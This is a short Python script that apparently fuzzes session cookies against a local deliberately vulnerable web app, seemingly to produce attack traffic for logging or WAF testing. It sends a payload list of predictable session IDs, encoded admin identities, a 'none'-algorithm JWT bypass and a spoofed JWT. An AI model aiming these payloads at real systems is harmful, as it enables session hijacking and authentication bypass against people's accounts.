import requests, time, random
TARGET = 'http://localhost:8080/vulnerabilities/sqli/'
SESSIONS = [
    # --- Basic: Weak / Predictable Session IDs ---
    '1234567890', 'admin', 'test', 'guest', 'user', '1111111111', 
    'sess_001', 'sess_002', 'sess_admin', 'PHPSESSID=123',
    
    # --- Medium: Encoded tokens / MD5 Hashes of common words ---
    'YWRtaW4=', 'MTEyMjMz', 'dGVzdA==', 'Z3Vlc3Q=', # Base64 identities
    '098f6bcd4621d373cade4e832627b4f6', # MD5 of 'test'
    '21232f297a57a5a743894a0e4a801fc3', # MD5 of 'admin'
    
    # --- Advanced: JWT tampering, Null payloads & Type Juggling ---
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', # JWT 'none' alg bypass
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature', # Spoofed JWT
    '', 'null', 'undefined', 'NaN', '0', 'true', 'false', '[]'
]
print('--- A07: Auth Failures (Session Fuzzing) ---')
for s in SESSIONS:
    # Inject fuzzy sessions
    COOKIES = {'PHPSESSID': s, 'security': 'low'}
    # Đẩy payload s vào 'vuln_session' trên URL để Apache ghi lại được log (Giả lập WAF trích xuất Cookie)
    res = requests.get(TARGET, params={'id': '1', 'Submit': 'Submit', 'vuln_session': s}, cookies=COOKIES)
    print(f'[*] Session Fuzz: {s} -> Status: {res.status_code}')
    time.sleep(random.uniform(0.5, 1.5))
